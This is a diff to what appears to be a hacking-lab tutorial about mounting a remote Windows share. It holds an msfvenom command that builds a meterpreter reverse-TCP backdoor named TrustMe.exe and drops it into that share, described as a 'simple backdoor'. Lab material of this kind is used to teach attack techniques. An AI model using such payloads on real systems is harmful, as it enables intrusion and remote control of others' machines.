@@ -51,9 +51,17 @@ We need to run the following commands in order to mount our remote system to the
 
 **REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
 
+If you see the following error, it means that the device is already mounted.
+
+![](attachments/mounterror.png)
+
+If this is the case, ignore it.
+
+Run the following command to navigate into the mounted directory:
+
+<pre>cd /mnt/windows-share</pre>
+
 Run the following commands to start a simple backdoor and backdoor listener: 
- 
-<pre>sudo su -</pre>
 
 <pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
